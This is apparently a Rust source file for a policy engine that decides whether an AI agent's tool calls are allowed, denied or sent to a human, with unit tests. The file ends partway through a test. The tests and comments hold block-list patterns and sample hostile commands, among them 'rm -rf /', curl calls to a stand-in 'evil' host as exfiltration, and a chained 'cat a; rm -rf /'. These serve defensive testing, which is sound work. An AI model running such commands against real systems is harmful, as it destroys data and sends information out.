use crate::spec::Autonomy;
use serde::{Deserialize, Serialize};
use serde_json::Value;

// ─── Policy document (YAML v0) ────────────────────────────────────────────

#[derive(Debug, Clone, Serialize)]
pub struct Policy {
    pub name: String,
    #[serde(default)]
    pub defaults: PolicyDefaults,
    #[serde(default)]
    pub egress: Egress,
    #[serde(default)]
    pub budgets: crate::spec::Budgets,
    #[serde(default)]
    pub approvals: ApprovalSettings,
    #[serde(default)]
    pub autonomy: AutonomySettings,
    #[serde(default)]
    pub tools: Vec<ToolRule>,
}

/// The lenient wire shape behind [`Policy`]'s `Deserialize`, plus the LEGACY
/// pre-0026 `managed_overrides` key.
#[derive(Deserialize)]
struct PolicyDe {
    name: String,
    #[serde(default)]
    defaults: PolicyDefaults,
    #[serde(default)]
    egress: Egress,
    #[serde(default)]
    budgets: crate::spec::Budgets,
    #[serde(default)]
    approvals: ApprovalSettings,
    #[serde(default)]
    autonomy: AutonomySettings,
    #[serde(default)]
    tools: Vec<ToolRule>,
    #[serde(default)]
    managed_overrides: Vec<LegacyToolOverride>,
}

/// The retired 0010 per-tool override shape, accepted ONLY at this boundary.
#[derive(Deserialize)]
struct LegacyToolOverride {
    tool: String,
    action: RuleAction,
}

/// Deserialization FOLDS a legacy `managed_overrides` key into head rules —
/// `{match: [tool], action}`, stored order, ahead of the authored rules — the
/// exact transform migration 0026 applies to stored policies (pinned
/// equivalent by `override_fold_preserves_every_verdict`). This is what keeps
/// a pre-0026 frozen RunSpec snapshot governing its in-flight run with
/// PRECISELY the semantics it froze, while `sessions.run_spec` stays
/// byte-identical: the engine has no override branch, the compat lives here.
/// Serialization never emits the key — a Policy that round-trips through us
/// is post-fold, canonically. Unknown keys stay IGNORED (never
/// `deny_unknown_fields` here — old blobs must keep deserializing); the
/// authoring path gets its strictness from [`Policy::parse_strict`] instead.
impl<'de> Deserialize<'de> for Policy {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let raw = PolicyDe::deserialize(deserializer)?;
        let head = raw.managed_overrides.into_iter().map(|o| ToolRule {
            r#match: vec![o.tool],
            action: o.action,
            risk: None,
            paths: None,
            shell: None,
            on_autonomous: None,
            approval_ttl_secs: None,
            approval_scope: None,
        });
        Ok(Policy {
            name: raw.name,
            defaults: raw.defaults,
            egress: raw.egress,
            budgets: raw.budgets,
            approvals: raw.approvals,
            autonomy: raw.autonomy,
            tools: head.chain(raw.tools).collect(),
        })
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicyDefaults {
    /// Verdict when no rule matches. Fail-safe default: approve (ask a human).
    #[serde(default = "default_tool_action")]
    pub tool_action: RuleAction,
}

impl Default for PolicyDefaults {
    fn default() -> Self {
        Self {
            tool_action: default_tool_action(),
        }
    }
}

fn default_tool_action() -> RuleAction {
    RuleAction::Approve
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "kebab-case")]
pub enum EgressMode {
    None,
    #[default]
    ProxyOnly,
    Allowlist,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct Egress {
    #[serde(default)]
    pub mode: EgressMode,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApprovalSettings {
    #[serde(default = "default_ttl")]
    pub default_ttl_secs: u64,
    #[serde(default)]
    pub scope: ApprovalScope,
    #[serde(default)]
    pub timeout_action: TimeoutAction,
}

impl Default for ApprovalSettings {
    fn default() -> Self {
        Self {
            default_ttl_secs: default_ttl(),
            scope: ApprovalScope::default(),
            timeout_action: TimeoutAction::default(),
        }
    }
}

fn default_ttl() -> u64 {
    600
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum ApprovalScope {
    #[default]
    Once,
    Session,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum TimeoutAction {
    #[default]
    Deny,
}

/// Autonomy behaviour: whether autonomous runs are permitted at all, and
/// what a `RequireApproval` verdict becomes when nobody is watching.
/// Fail-safe default: deny. Human absence narrows permissions, never widens.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutonomySettings {
    #[serde(default = "default_true")]
    pub permitted: bool,
    #[serde(default)]
    pub on_approval_rule: AutonomousFallback,
}

impl Default for AutonomySettings {
    fn default() -> Self {
        Self {
            permitted: true,
            on_approval_rule: AutonomousFallback::default(),
        }
    }
}

fn default_true() -> bool {
    true
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum AutonomousFallback {
    #[default]
    Deny,
    Allow,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum RuleAction {
    Allow,
    /// Fail-safe default: ask a human.
    #[default]
    Approve,
    Deny,
}

/// One ordered rule. First rule whose tool matcher hits wins; its
/// constraints (paths / shell) then decide the verdict.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolRule {
    /// Tool name matchers; `*` suffix wildcard supported (e.g. `mcp__*`).
    pub r#match: Vec<String>,
    pub action: RuleAction,
    #[serde(default)]
    pub risk: Option<String>,
    #[serde(default)]
    pub paths: Option<PathRules>,
    #[serde(default)]
    pub shell: Option<ShellRules>,
    /// Per-rule override of the autonomy fallback.
    #[serde(default)]
    pub on_autonomous: Option<AutonomousFallback>,
    /// Per-rule approval overrides.
    #[serde(default)]
    pub approval_ttl_secs: Option<u64>,
    #[serde(default)]
    pub approval_scope: Option<ApprovalScope>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct PathRules {
    #[serde(default)]
    pub allow: Vec<String>,
    #[serde(default)]
    pub deny: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ShellRules {
    /// Commands starting with one of these (token-boundary aware) get the
    /// rule's `action`.
    #[serde(default)]
    pub allow_prefixes: Vec<String>,
    /// Any match here is an immediate deny, before prefixes are consulted.
    #[serde(default)]
    pub deny_regex: Vec<String>,
    /// Verdict when neither deny nor an allow-prefix hits. Fail-safe: approve.
    #[serde(default = "default_tool_action")]
    pub on_no_match: RuleAction,
}

// ─── Strict authoring mirror ──────────────────────────────────────────────
//
// The publish path parses drafts through THIS shape (`deny_unknown_fields` at
// every level), so a typo'd field name is a 422 — never a silently-dropped
// key publishing a weaker policy than its author reviewed. Stored blobs keep
// the lenient [`Policy`] deserializer above: frozen snapshots carry keys
// (`managed_overrides`) this shape deliberately refuses.

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct DraftPolicy {
    name: String,
    #[serde(default)]
    defaults: DraftDefaults,
    #[serde(default)]
    egress: DraftEgress,
    #[serde(default)]
    budgets: DraftBudgets,
    #[serde(default)]
    approvals: DraftApprovals,
    #[serde(default)]
    autonomy: DraftAutonomy,
    #[serde(default)]
    tools: Vec<DraftToolRule>,
}

#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct DraftDefaults {
    #[serde(default = "default_tool_action")]
    tool_action: RuleAction,
}

#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct DraftEgress {
    #[serde(default)]
    mode: EgressMode,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct DraftBudgets {
    max_wall_clock_secs: Option<u64>,
    max_tokens: Option<u64>,
    max_cost_usd: Option<f64>,
    max_tool_calls: Option<u64>,
}

impl Default for DraftBudgets {
    fn default() -> Self {
        let b = crate::spec::Budgets::default();
        Self {
            max_wall_clock_secs: b.max_wall_clock_secs,
            max_tokens: b.max_tokens,
            max_cost_usd: b.max_cost_usd,
            max_tool_calls: b.max_tool_calls,
        }
    }
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct DraftApprovals {
    #[serde(default = "default_ttl")]
    default_ttl_secs: u64,
    #[serde(default)]
    scope: ApprovalScope,
    #[serde(default)]
    timeout_action: TimeoutAction,
}

impl Default for DraftApprovals {
    fn default() -> Self {
        Self {
            default_ttl_secs: default_ttl(),
            scope: ApprovalScope::default(),
            timeout_action: TimeoutAction::default(),
        }
    }
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct DraftAutonomy {
    #[serde(default = "default_true")]
    permitted: bool,
    #[serde(default)]
    on_approval_rule: AutonomousFallback,
}

impl Default for DraftAutonomy {
    fn default() -> Self {
        Self {
            permitted: true,
            on_approval_rule: AutonomousFallback::default(),
        }
    }
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct DraftToolRule {
    r#match: Vec<String>,
    action: RuleAction,
    #[serde(default)]
    risk: Option<String>,
    #[serde(default)]
    paths: Option<DraftPathRules>,
    #[serde(default)]
    shell: Option<DraftShellRules>,
    #[serde(default)]
    on_autonomous: Option<AutonomousFallback>,
    #[serde(default)]
    approval_ttl_secs: Option<u64>,
    #[serde(default)]
    approval_scope: Option<ApprovalScope>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct DraftPathRules {
    #[serde(default)]
    allow: Vec<String>,
    #[serde(default)]
    deny: Vec<String>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct DraftShellRules {
    #[serde(default)]
    allow_prefixes: Vec<String>,
    #[serde(default)]
    deny_regex: Vec<String>,
    #[serde(default = "default_tool_action")]
    on_no_match: RuleAction,
}

impl From<DraftPolicy> for Policy {
    fn from(d: DraftPolicy) -> Self {
        Policy {
            name: d.name,
            defaults: PolicyDefaults {
                tool_action: d.defaults.tool_action,
            },
            egress: Egress {
                mode: d.egress.mode,
            },
            budgets: crate::spec::Budgets {
                max_wall_clock_secs: d.budgets.max_wall_clock_secs,
                max_tokens: d.budgets.max_tokens,
                max_cost_usd: d.budgets.max_cost_usd,
                max_tool_calls: d.budgets.max_tool_calls,
            },
            approvals: ApprovalSettings {
                default_ttl_secs: d.approvals.default_ttl_secs,
                scope: d.approvals.scope,
                timeout_action: d.approvals.timeout_action,
            },
            autonomy: AutonomySettings {
                permitted: d.autonomy.permitted,
                on_approval_rule: d.autonomy.on_approval_rule,
            },
            tools: d
                .tools
                .into_iter()
                .map(|r| ToolRule {
                    r#match: r.r#match,
                    action: r.action,
                    risk: r.risk,
                    paths: r.paths.map(|p| PathRules {
                        allow: p.allow,
                        deny: p.deny,
                    }),
                    shell: r.shell.map(|s| ShellRules {
                        allow_prefixes: s.allow_prefixes,
                        deny_regex: s.deny_regex,
                        on_no_match: s.on_no_match,
                    }),
                    on_autonomous: r.on_autonomous,
                    approval_ttl_secs: r.approval_ttl_secs,
                    approval_scope: r.approval_scope,
                })
                .collect(),
        }
    }
}

impl Policy {
    /// Parse AUTHORED content (the publish/preview paths): unknown fields are
    /// refused at every level, then the result passes [`Policy::validate`].
    /// Legacy stored blobs go through the lenient `Deserialize` instead.
    pub fn parse_strict(value: Value) -> Result<Policy, String> {
        let draft: DraftPolicy = serde_json::from_value(value).map_err(|e| e.to_string())?;
        let policy: Policy = draft.into();
        policy.validate()?;
        Ok(policy)
    }

    /// [`Policy::parse_strict`] for AUTHORED YAML (the import, validate, and
    /// boot-seed paths): a typo'd key in a yaml file must refuse, not silently
    /// weaken the policy it describes. `parse_yaml` stays lenient for stored
    /// blobs and test fixtures.
    pub fn parse_yaml_strict(yaml: &str) -> Result<Policy, String> {
        let value: Value = serde_yaml::from_str(yaml).map_err(|e| e.to_string())?;
        Self::parse_strict(value)
    }
}

// ─── Evaluation ───────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "verdict", rename_all = "snake_case")]
pub enum Verdict {
    Allow,
    Deny {
        reason: String,
    },
    RequireApproval {
        risk: Option<String>,
        ttl_secs: u64,
        scope: ApprovalScope,
        /// Key for `approved_session` scope: the tool name — except Bash,
        /// where it is the matched prefix / first token, so approving
        /// `git push` covers `git push`, not all shell.
        scope_key: String,
    },
}

impl Verdict {
    pub fn name(&self) -> &'static str {
        match self {
            Verdict::Allow => "allow",
            Verdict::Deny { .. } => "deny",
            Verdict::RequireApproval { .. } => "require_approval",
        }
    }
}

#[derive(Debug, Clone)]
pub struct ToolCallRequest {
    pub tool: String,
    pub input: Value,
}

/// What the engine hands back: the policy's original verdict plus the
/// effective verdict after autonomy resolution. Both are ledgered.
#[derive(Debug, Clone)]
pub struct EvaluationOutcome {
    pub original: Verdict,
    pub effective: Verdict,
    pub autonomy_rewritten: bool,
    pub matched_rule: Option<usize>,
}

/// A display-ready summary of a policy's autonomy posture. Facts only — the
/// API emits these; the dashboard phrases them.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AutonomySummary {
    pub permitted: bool,
    pub default_fallback: AutonomousFallback,
    /// Rules overriding the fallback to `allow`, counted ONLY where the rule
    /// can actually reach RequireApproval.
    pub allow_overrides: usize,
    /// Same, for `deny`.
    pub deny_overrides: usize,
}

/// The display-only constraint payload of a conditional rule.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
pub struct ConstraintSummary {
    #[serde(default)]
    pub paths_allow: Vec<String>,
    #[serde(default)]
    pub paths_deny: Vec<String>,
    /// The verdict for a path OUTSIDE `paths_allow`. `apply_rule` hardcodes an
    /// escalation to a human there, so this is `Some(RuleAction::Approve)`
    /// whenever `paths_allow` is non-empty — it exists so the UI can state the
    /// "asks elsewhere" clause without re-deriving apply_rule's constant.
    #[serde(default)]
    pub paths_on_no_match: Option<RuleAction>,
    #[serde(default)]
    pub shell_allow_prefixes: Vec<String>,
    #[serde(default)]
    pub shell_deny_regex: Vec<String>,
    #[serde(default)]
    pub shell_on_no_match: Option<RuleAction>,
}

/// What the policy says about ONE exact tool, resolved statically.
///
/// `Conditional` exists because `evaluate` takes a ToolCallRequest WITH INPUT:
/// a rule carrying `paths`/`shell` yields different verdicts for different
/// paths/commands, so no flat Allow/Ask/Deny can represent it. Such rows are
/// display-only — offering a control would let one click delete
/// `paths.deny: **/.env`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "status", rename_all = "snake_case")]
pub enum ToolStatus {
    Unconditional {
        action: RuleAction,
        rule: Option<usize>,
    },
    Conditional {
        /// The rule's CONSTRAINT-SATISFIED action — what happens when the
        /// constraints are MET (for shell, the allow-prefix-hit branch; NOT
        /// `shell_on_no_match`), NOT this tool's effective verdict. A row
        /// headlined "Bash → Allow" off this field would be a lie: the same
        /// rule denies on a deny_regex hit and asks on `shell_on_no_match`.
        /// Read it only alongside `constraints`.
        action: RuleAction,
        rule: usize,
        constraints: ConstraintSummary,
    },
    Default {
        action: RuleAction,
    },
}

/// Can this rule ever produce a RequireApproval verdict? Mirrors the THREE
/// routes in `apply_rule`. A rule that can never approve makes its
/// `on_autonomous` dead config — counting it would claim an exception that can
/// never fire.
fn can_require_approval(rule: &ToolRule) -> bool {
    // Shell constraints short-circuit apply_rule: it returns from inside that
    // branch on every path, so `paths` is dead for a shell rule.
    if let Some(sh) = &rule.shell {
        return rule.action == RuleAction::Approve || sh.on_no_match == RuleAction::Approve;
    }
    // A non-empty paths.allow escalates out-of-tree paths to a human via a
    // HARDCODED Approve in apply_rule, whatever the rule's action says.
    if rule.paths.as_ref().is_some_and(|p| !p.allow.is_empty()) {
        return true;
    }
    rule.action == RuleAction::Approve
}

impl Policy {
    pub fn parse_yaml(yaml: &str) -> Result<Policy, String> {
        let p: Policy = serde_yaml::from_str(yaml).map_err(|e| e.to_string())?;
        p.validate()?;
        Ok(p)
    }

    pub fn validate(&self) -> Result<(), String> {
        if self.name.trim().is_empty() {
            return Err("policy name must not be empty".into());
        }
        for (i, rule) in self.tools.iter().enumerate() {
            if rule.r#match.is_empty() {
                return Err(format!("tools[{i}]: match must not be empty"));
            }
            if let Some(sh) = &rule.shell {
                for r in &sh.deny_regex {
                    regex::Regex::new(r)
                        .map_err(|e| format!("tools[{i}]: bad deny_regex {r:?}: {e}"))?;
                }
            }
            if let Some(p) = &rule.paths {
                for g in p.allow.iter().chain(p.deny.iter()) {
                    globset::Glob::new(g)
                        .map_err(|e| format!("tools[{i}]: bad glob {g:?}: {e}"))?;
                }
            }
        }
        Ok(())
    }

    pub fn autonomy_summary(&self) -> AutonomySummary {
        let mut allow_overrides = 0;
        let mut deny_overrides = 0;
        for rule in &self.tools {
            if !can_require_approval(rule) {
                continue;
            }
            match rule.on_autonomous {
                Some(AutonomousFallback::Allow) => allow_overrides += 1,
                Some(AutonomousFallback::Deny) => deny_overrides += 1,
                None => {}
            }
        }
        AutonomySummary {
            permitted: self.autonomy.permitted,
            default_fallback: self.autonomy.on_approval_rule,
            allow_overrides,
            deny_overrides,
        }
    }

    /// Resolve each tool's status against this policy. Reuses `tool_matches` — the
    /// matcher `evaluate_supervised` uses — so the page and the gate can never
    /// disagree about which rule wins.
    pub fn tool_matrix(&self, tools: &[String]) -> Vec<(String, ToolStatus)> {
        tools
            .iter()
            .map(|t| (t.clone(), self.tool_status(t)))
            .collect()
    }

    fn tool_status(&self, tool: &str) -> ToolStatus {
        for (i, rule) in self.tools.iter().enumerate() {
            if !rule.r#match.iter().any(|m| tool_matches(m, tool)) {
                continue;
            }
            let conditional = rule.paths.is_some() || rule.shell.is_some();
            if !conditional {
                return ToolStatus::Unconditional {
                    action: rule.action,
                    rule: Some(i),
                };
            }
            let mut c = ConstraintSummary::default();
            if let Some(p) = &rule.paths {
                c.paths_allow = p.allow.clone();
                c.paths_deny = p.deny.clone();
                // Mirrors `apply_rule`: a non-empty allow list escalates
                // out-of-tree paths to a human via a hardcoded Approve. An
                // EMPTY allow list skips that guard entirely — the rule falls
                // through to `rule.action`, so there is no clause to state.
                c.paths_on_no_match = (!p.allow.is_empty()).then_some(RuleAction::Approve);
            }
            if let Some(s) = &rule.shell {
                c.shell_allow_prefixes = s.allow_prefixes.clone();
                c.shell_deny_regex = s.deny_regex.clone();
                c.shell_on_no_match = Some(s.on_no_match);
            }
            return ToolStatus::Conditional {
                action: rule.action,
                rule: i,
                constraints: c,
            };
        }
        ToolStatus::Default {
            action: self.defaults.tool_action,
        }
    }

    pub fn evaluate(&self, req: &ToolCallRequest, autonomy: Autonomy) -> EvaluationOutcome {
        let (original, matched_rule) = self.evaluate_supervised(req);
        // Autonomy is resolved INSIDE the engine: a RequireApproval verdict
        // never leaves here unrewritten on an autonomous run.
        if autonomy == Autonomy::Autonomous {
            if let Verdict::RequireApproval { .. } = original {
                let fallback = matched_rule
                    .and_then(|i| self.tools[i].on_autonomous)
                    .unwrap_or(self.autonomy.on_approval_rule);
                let effective = match fallback {
                    AutonomousFallback::Allow => Verdict::Allow,
                    AutonomousFallback::Deny => Verdict::Deny {
                        reason:
                            "requires human approval; run is autonomous (policy fallback: deny)"
                                .into(),
                    },
                };
                return EvaluationOutcome {
                    original,
                    effective,
                    autonomy_rewritten: true,
                    matched_rule,
                };
            }
        }
        EvaluationOutcome {
            effective: original.clone(),
            original,
            autonomy_rewritten: false,
            matched_rule,
        }
    }

    fn evaluate_supervised(&self, req: &ToolCallRequest) -> (Verdict, Option<usize>) {
        for (i, rule) in self.tools.iter().enumerate() {
            if !rule.r#match.iter().any(|m| tool_matches(m, &req.tool)) {
                continue;
            }
            return (self.apply_rule(rule, req), Some(i));
        }
        (
            self.finish(self.defaults.tool_action, None, &req.tool, None),
            None,
        )
    }

    fn apply_rule(&self, rule: &ToolRule, req: &ToolCallRequest) -> Verdict {
        // Shell constraints (Bash-shaped tools).
        if let Some(sh) = &rule.shell {
            let command = req
                .input
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .trim();
            for pat in &sh.deny_regex {
                if let Ok(re) = regex::Regex::new(pat) {
                    if re.is_match(command) {
                        return Verdict::Deny {
                            reason: format!("shell command matches deny pattern {pat:?}"),
                        };
                    }
                }
            }
            for prefix in &sh.allow_prefixes {
                if prefix_matches(prefix, command) {
                    return self.finish(rule.action, Some(rule), &req.tool, Some(prefix.clone()));
                }
            }
            let scope_key = command.split_whitespace().next().unwrap_or("").to_string();
            return self.finish(sh.on_no_match, Some(rule), &req.tool, Some(scope_key));
        }

        // Path constraints (file tools).
        if let Some(paths) = &rule.paths {
            let candidates = extract_paths(&req.input);
            for path in &candidates {
                for deny in &paths.deny {
                    if glob_hit(deny, path) {
                        return Verdict::Deny {
                            reason: format!("path {path:?} matches deny glob {deny:?}"),
                        };
                    }
                }
            }
            if !paths.allow.is_empty() {
                let all_allowed = !candidates.is_empty()
                    && candidates
                        .iter()
                        .all(|p| paths.allow.iter().any(|g| glob_hit(g, p)));
                if !all_allowed {
                    // Outside the allowed tree → escalate to a human rather
                    // than brick the run. NOTE: this hardcoded Approve is a
                    // route to RequireApproval INDEPENDENT of `rule.action` —
                    // `can_require_approval` mirrors it. Adding another route
                    // to RequireApproval means updating that mirror too, or
                    // `autonomy_summary` will undercount live overrides.
                    return self.finish(RuleAction::Approve, Some(rule), &req.tool, None);
                }
            }
        }

        self.finish(rule.action, Some(rule), &req.tool, None)
    }

    fn finish(
        &self,
        action: RuleAction,
        rule: Option<&ToolRule>,
        tool: &str,
        shell_scope: Option<String>,
    ) -> Verdict {
        match action {
            RuleAction::Allow => Verdict::Allow,
            RuleAction::Deny => Verdict::Deny {
                reason: rule
                    .and_then(|r| r.risk.clone())
                    .unwrap_or_else(|| "denied by policy".into()),
            },
            RuleAction::Approve => Verdict::RequireApproval {
                risk: rule.and_then(|r| r.risk.clone()),
                ttl_secs: rule
                    .and_then(|r| r.approval_ttl_secs)
                    .unwrap_or(self.approvals.default_ttl_secs),
                scope: rule
                    .and_then(|r| r.approval_scope)
                    .unwrap_or(self.approvals.scope),
                scope_key: shell_scope.unwrap_or_else(|| tool.to_string()),
            },
        }
    }
}

// ─── Trust tier (design §7.3) ─────────────────────────────────────────────

/// Tools that only observe the workspace. Kept deliberately small: the
/// read-only tier is an allowlist, so anything not listed is denied.
const READ_SAFE_TOOLS: [&str; 5] = ["Read", "Glob", "Grep", "LS", "NotebookRead"];

/// Shell commands that only observe. Token-boundary matched (like policy
/// `allow_prefixes`), and only after the metacharacter screen below.
const READ_SAFE_PREFIXES: [&str; 14] = [
    "ls",
    "cat",
    "head",
    "tail",
    "wc",
    "grep",
    "rg",
    "pwd",
    "git status",
    "git log",
    "git diff",
    "git show",
    "git branch",
    "git blame",
];

/// `TrustTier::ReadOnly` enforcement (fork / untrusted event sources):
/// review yes; writes, execution, egress, secrets no. Returns the deny
/// reason when the call is NOT read-safe. Applied at the permission gate ON
/// TOP of the policy verdict, and only ever narrows — neither a policy, a
/// subscription, nor a human approval can widen past it (there is no
/// approval escape: fork runs are hard read-only).
pub fn read_only_denial(req: &ToolCallRequest) -> Option<String> {
    if READ_SAFE_TOOLS.contains(&req.tool.as_str()) {
        return None;
    }
    if req.tool == "Bash" {
        let command = req
            .input
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .trim();
        // Any shell metacharacter defeats prefix reasoning ("cat a; rm -rf /"
        // starts with an allowed prefix) — deny the lot. Over-denying is the
        // fail-safe direction for adversarial input.
        let has_meta = command.chars().any(|c| {
            matches!(
                c,
                ';' | '|' | '&' | '`' | '$' | '(' | ')' | '<' | '>' | '\n'
            )
        });
        if !has_meta
            && READ_SAFE_PREFIXES
                .iter()
                .any(|p| prefix_matches(p, command))
        {
            return None;
        }
        return Some(format!(
            "read-only trust tier (untrusted event source): shell command {:?} is not on the read-only allowlist",
            command.chars().take(120).collect::<String>()
        ));
    }
    Some(format!(
        "read-only trust tier (untrusted event source): tool '{}' can write, execute, or reach outside the workspace",
        req.tool
    ))
}

fn tool_matches(pattern: &str, tool: &str) -> bool {
    if pattern == "*" {
        return true;
    }
    if let Some(prefix) = pattern.strip_suffix('*') {
        return tool.starts_with(prefix);
    }
    pattern == tool
}

/// Token-boundary prefix match: "git push" matches "git push origin" but
/// not "git pushx" — and never matches inside "echo git push".
fn prefix_matches(prefix: &str, command: &str) -> bool {
    let p = prefix.trim();
    if p.is_empty() || !command.starts_with(p) {
        return false;
    }
    matches!(
        command.as_bytes().get(p.len()),
        None | Some(b' ') | Some(b'\t')
    )
}

fn glob_hit(glob: &str, path: &str) -> bool {
    globset::GlobBuilder::new(glob)
        .literal_separator(false)
        .build()
        .map(|g| g.compile_matcher().is_match(path))
        .unwrap_or(false)
}

fn extract_paths(input: &Value) -> Vec<String> {
    const KEYS: [&str; 4] = ["file_path", "path", "notebook_path", "filePath"];
    let mut out = Vec::new();
    if let Value::Object(m) = input {
        for k in KEYS {
            if let Some(Value::String(s)) = m.get(k) {
                out.push(s.clone());
            }
        }
        // Edit arrays (MultiEdit-shape)
        if let Some(Value::Array(edits)) = m.get("edits") {
            for e in edits {
                if let Some(Value::String(s)) = e.get("file_path") {
                    out.push(s.clone());
                }
            }
        }
    }
    out
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const POLICY: &str = r#"
name: test
defaults:
  tool_action: approve
autonomy:
  permitted: true
  on_approval_rule: deny
approvals:
  default_ttl_secs: 600
  scope: once
tools:
  - match: ["Read", "Glob", "Grep"]
    action: allow
  - match: ["Edit", "Write"]
    action: allow
    paths:
      allow: ["/workspace/**"]
      deny: ["**/.env", "**/.git/**"]
  - match: ["Bash"]
    action: allow
    shell:
      allow_prefixes: ["ls", "pytest", "git status", "git diff", "git add", "git commit"]
      deny_regex: ["rm\\s+-rf\\s+/", "\\bcurl\\b", "\\bwget\\b"]
      on_no_match: approve
  - match: ["WebFetch", "WebSearch"]
    action: deny
    risk: "network egress"
  - match: ["mcp__*"]
    action: approve
    on_autonomous: allow
"#;

    fn policy() -> Policy {
        Policy::parse_yaml(POLICY).unwrap()
    }

    fn req(tool: &str, input: Value) -> ToolCallRequest {
        ToolCallRequest {
            tool: tool.into(),
            input,
        }
    }

    #[test]
    fn read_is_allowed() {
        let out = policy().evaluate(
            &req("Read", json!({"file_path": "/etc/passwd"})),
            Autonomy::Supervised,
        );
        assert_eq!(out.effective, Verdict::Allow);
    }

    #[test]
    fn edit_inside_workspace_allowed_outside_escalates() {
        let p = policy();
        let inside = p.evaluate(
            &req("Edit", json!({"file_path": "/workspace/repo/a.py"})),
            Autonomy::Supervised,
        );
        assert_eq!(inside.effective, Verdict::Allow);
        let outside = p.evaluate(
            &req("Edit", json!({"file_path": "/etc/hosts"})),
            Autonomy::Supervised,
        );
        assert!(matches!(outside.effective, Verdict::RequireApproval { .. }));
    }

    #[test]
    fn env_file_write_denied_even_inside_workspace() {
        let out = policy().evaluate(
            &req("Write", json!({"file_path": "/workspace/repo/.env"})),
            Autonomy::Supervised,
        );
        assert!(matches!(out.effective, Verdict::Deny { .. }));
    }

    #[test]
    fn shell_deny_regex_beats_prefixes() {
        let out = policy().evaluate(
            &req("Bash", json!({"command": "ls && curl http://evil"})),
            Autonomy::Supervised,
        );
        assert!(matches!(out.effective, Verdict::Deny { .. }));
    }

    #[test]
    fn shell_prefix_is_token_bounded() {
        let p = policy();
        let ok = p.evaluate(
            &req("Bash", json!({"command": "git status"})),
            Autonomy::Supervised,
        );
        assert_eq!(ok.effective, Verdict::Allow);
        let sneaky = p.evaluate(
            &req("Bash", json!({"command": "git statusx"})),
            Autonomy::Supervised,
        );
        assert!(matches!(sneaky.effective, Verdict::RequireApproval { .. }));
    }

    #[test]
    fn shell_unknown_command_escalates_with_first_token_scope() {
        let out = policy().evaluate(
            &req("Bash", json!({"command": "git push origin main"})),
            Autonomy::Supervised,
        );
        match out.effective {
            Verdict::RequireApproval { scope_key, .. } => assert_eq!(scope_key, "git"),
            v => panic!("expected approval, got {v:?}"),
        }
    }

    #[test]
    fn default_is_fail_safe_approve() {
        let out = policy().evaluate(&req("SomeNewTool", json!({})), Autonomy::Supervised);
        assert!(matches!(out.effective, Verdict::RequireApproval { .. }));
    }

    #[test]
    fn autonomous_rewrites_approval_to_deny_and_records_original() {
        let out = policy().evaluate(&req("SomeNewTool", json!({})), Autonomy::Autonomous);
        assert!(out.autonomy_rewritten);
        assert_eq!(out.original.name(), "require_approval");
        assert!(matches!(out.effective, Verdict::Deny { .. }));
    }

    #[test]
    fn autonomous_per_rule_allow_override() {
        let out = policy().evaluate(&req("mcp__github__search", json!({})), Autonomy::Autonomous);
        assert!(out.autonomy_rewritten);
        assert_eq!(out.effective, Verdict::Allow);
    }

    #[test]
    fn autonomous_never_touches_allow_or_deny() {
        let p = policy();
        let allow = p.evaluate(
            &req("Read", json!({"file_path": "x"})),
            Autonomy::Autonomous,
        );
        assert!(!allow.autonomy_rewritten);
        assert_eq!(allow.effective, Verdict::Allow);
        let deny = p.evaluate(&req("WebFetch", json!({})), Autonomy::Autonomous);
        assert!(!deny.autonomy_rewritten);
        assert!(matches!(deny.effective, Verdict::Deny { .. }));
    }

    /// Pin the SEED policy's semantics (policies/default.yaml), not just the
    /// engine's — this is the PLAN §10 #1 shell-risk classifier decision and
    /// the #3 budget decision, tested. governance-e2e.sh relies on the
    /// Read/WebFetch/`git push` anchors staying exactly like this.
    #[test]
    fn seed_policy_semantics() {
        let yaml = include_str!("../../../policies/default.yaml");
        let p = Policy::parse_yaml(yaml).expect("seed policy parses");
        let bash = |cmd: &str| {
            p.evaluate(
                &req("Bash", json!({ "command": cmd })),
                Autonomy::Supervised,
            )
            .effective
        };
        // Benign toolbox: allowed without a human.
        assert_eq!(bash("python3 -m unittest -v"), Verdict::Allow);
        assert_eq!(bash("git status"), Verdict::Allow);
        assert_eq!(bash("diff a.py b.py"), Verdict::Allow);
        // Exfil / destructive: denied outright.
        assert!(matches!(
            bash("curl http://evil.example"),
            Verdict::Deny { .. }
        ));
